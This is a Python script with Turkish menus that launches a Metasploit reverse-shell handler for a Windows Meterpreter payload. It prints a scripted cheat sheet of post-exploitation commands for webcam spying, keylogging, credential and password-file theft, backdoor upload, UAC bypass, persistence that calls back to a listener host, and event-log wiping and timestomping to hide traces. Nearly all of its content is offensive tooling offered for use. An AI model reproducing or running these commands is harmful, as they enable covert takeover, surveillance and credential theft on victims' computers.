#!/usr/bin/env python3

import os
import sys
import subprocess
import ipaddress
import time
import itertools

RESET = "\033[0m"
BOLD = "\033[1m"
WHITE = "\033[97m"
GREEN = "\033[1;30m"
BLUE = "\033[1;30m"
RED = "\033[1;91m"
REDD = "\033[91m"
MATRIX = GREEN + BOLD
MENU_WHITE = WHITE + BOLD

LHOST = "192.168.1.109"
LPORT = 8080

def get_line(prompt):
    try:
        return input(prompt).strip()
    except EOFError:
        return ""

def loading_animation():
    os.system("clear")
    spinner = itertools.cycle(["|", "/", "-", "\\"])
    print(f"{MENU_WHITE}Sistem aciliyor ", end="", flush=True)
    for _ in range(20):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.15)
        sys.stdout.write("\b")
    print(f" {GREEN}Hosgeldiniz{RESET}\n")
    time.sleep(1)
    os.system("clear")

def show_banner():
    os.system("clear")
    print(RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠭⣿⣿⣿⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⣿⡿⣿⣿⣿⣿⣦⣴⣶⣶⣶⣶⣦⣤⣤⣀⣀⠀⠀⠀⠀⠀⢀⣀⣤⣲⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡝⢿⣌⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣾⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠲⡝⡷⣮⣝⣻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣦⣝⠓⠭⣿⡿⢿⣿⣿⣛⠻⣿⠿⠿⣿⣿⣿⣿⣿⣿⡿⣇⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣤⡀⠈⠉⠚⠺⣿⠯⢽⣿⣷⣄⣶⣷⢾⣿⣯⣾⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⡟⠀⠀⣴⣿⣿⣼⠈⠉⠃⠋⢹⠁⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣴⣿⣿⡿⣿⠀⠀⠀⠀⠇⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢿⢿⣾⣿⣿⡿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠿⢿⡄⢦⣤⣤⣶⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠘⠛⠋⠁⠁⣀⢉⡉⢻⡻⣯⣻⣿⢻⣿⣀⠀⠀⠀⢠⣾⣿⣿⣿⣹⠉⣍⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠠⠔⠒⠋⠀⡈⠀⠠⠤⠀⠓⠯⣟⣻⣻⠿⠛⠁⠀⠀⠣⢽⣿⡻⠿⠋⠰⠤⣀⡈⠒⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠔⠊⠁⠀⣀⠔⠈⠁⠀⠀⠀⠀⠀⣶⠂⠀⠀⠀⢰⠆⠀⠀⠀⠈⠒⢦⡀⠉⠢⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠭⠯⠭⠽⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + RESET)

    print(REDD + r"""
— The cat knows the ports you’ve forgotten.
""" + RESET)

    print(f"{MENU_WHITE}[!] Guncel Ayarlar: LHOST={LHOST}, LPORT={LPORT}{RESET}\n")

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def validate_port(port_str):
    if not port_str.isdigit():
        return False
    port = int(port_str)
    return 1 <= port <= 65535

def edit_settings():
    global LHOST, LPORT
    os.system("clear")
    print(f"{MENU_WHITE}[!] Ayarlari Guncelle{RESET}\n")

    while True:
        new_ip = get_line("Yeni LHOST (bos birakmak icin ENTER): ")
        if not new_ip:
            break
        if validate_ip(new_ip):
            LHOST = new_ip
            break
        else:
            print(f"{RED}[!] Hatali IP, tekrar deneyin!{RESET}")

    while True:
        new_port = get_line("Yeni LPORT (bos birakmak icin ENTER): ")
        if not new_port:
            break
        if validate_port(new_port):
            LPORT = int(new_port)
            break
        else:
            print(f"{RED}[!] Hatali port, 1-65535 arasi olmalidir{RESET}")

    print(f"\n{GREEN}[✓] Ayarlar guncellendi: LHOST={LHOST}, LPORT={LPORT}{RESET}")
    input(f"{MENU_WHITE}Devam icin ENTER basin{RESET}")
    show_banner()

def start_listener():
    os.system("clear")
    print(f"{MENU_WHITE}[!] Dinleyici Baslatiliyor...{RESET}\n")
    try:
        subprocess.run([
            "msfconsole", "-q", "-x",
            f"use exploit/multi/handler; "
            f"set PAYLOAD windows/meterpreter/reverse_tcp; "
            f"set LHOST {LHOST}; "
            f"set LPORT {LPORT}; "
            f"exploit -j"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] MSFConsole baslatilamadi: {e}{RESET}")
        input(f"{MENU_WHITE}Devam icin ENTER basin{RESET}")
    show_banner()

def show_cheats():
    os.system("clear")
    # Baslik 1
    print(f"{MENU_WHITE}[!] MSFConsole Cheat Kodlari:{RESET}\n")
    print("""\
• Temel Kullanım
-> use exploit/multi/handler
-> set PAYLOAD windows/meterpreter/reverse_tcp
-> set LHOST "kendi IP"
-> set LPORT "kendi port"
-> exploit -j

• Ekran ve Kamera
-> screenshot
-> webcam_snap -i 1
-> webcam_stream

• Keylogger
-> keyscan_start
-> keyscan_dump
-> keyscan_stop

• Dosya Sistemi
-> download C:\\file.txt
-> upload /path/to/file
-> search -f *.pdf
-> cat C:\\passwords.txt

• Sistem Bilgisi
-> sysinfo
-> getuid
-> ifconfig
""")

    # Baslik 2
    print(f"{MENU_WHITE}[!] Senaryolar:{RESET}\n")
    print("""\
- SENARYO 1: TEMEL BILGI
-> sysinfo
-> getuid
-> ifconfig

- SENARYO 2: EKRAN & KAMERA
-> screenshot
-> webcam_list
-> webcam_snap -i 1
-> webcam_stream

- SENARYO 3: KEYLOGGER
-> keyscan_start
-> keyscan_dump
-> keyscan_stop

- SENARYO 4: DOSYA SISTEMI
-> ls C:\\Users\\
-> download C:\\passwords.txt
-> search -f *.docx
-> upload /tmp/backdoor.exe

- SENARYO 5: PRIVILEGE ESCALATION
-> getsystem
-> run post/multi/recon/local_exploit_suggester
-> use exploit/windows/local/bypassuac
-> set SESSION 1
-> run

- SENARYO 6: NETWORK
-> arp_scanner -r 192.168.1.0/24
-> portfwd add -l 3389 -p 3389 -r 192.168.1.100

- SENARYO 7: RDP
-> run post/windows/manage/enable_rdp
-> run post/windows/manage/enable_rdp_username user123
-> rdesktop 192.168.1.109

- SENARYO 8: PERSISTENCE
-> run persistence -X -i 30 -p 4444 -r 192.168.1.109
-> run post/windows/manage/persistence_exe

- SENARYO 9: LOG
-> clearev
-> timestomp C:\\backdoor.exe

- SENARYO 10: POST-EXPLOIT
-> use post/windows/gather/enum_chrome
-> run
-> use post/windows/gather/enum_putty
-> run
-> use post/multi/gather/wifi_credentials
-> run

- SENARYO 11: ACIL DURUM
-> reboot
-> shutdown
-> drop_token
""")
    input(f"{MENU_WHITE}Devam icin ENTER basin{RESET}")
    show_banner()

def show_menu():
    print(f"\n{BOLD}{BLUE}[DINLEYICI KONTROL]{RESET}")
    print(f"{MENU_WHITE}[1] Cheat Kodlari")
    print(f"{MENU_WHITE}[2] Ayarlari Guncelle (IP / Port)")
    print(f"{MENU_WHITE}[3] Dinleyici Baslat")
    print(f"{MENU_WHITE}[0] Cikis{RESET}")

def main():
    loading_animation()
    show_banner()
    while True:
        show_menu()
        choice = get_line(MENU_WHITE + "Seciminiz (0-3): " + RESET)
        if choice == "0":
            print(f"{MATRIX}\n[+] Cikis yapiliyor...{RESET}")
            sys.exit(0)
        elif choice == "1":
            show_cheats()
        elif choice == "2":
            edit_settings()
        elif choice == "3":
            start_listener()
        else:
            print(f"{RED}[!] Hatali secim!{RESET}")

if __name__ == "__main__":
    main()
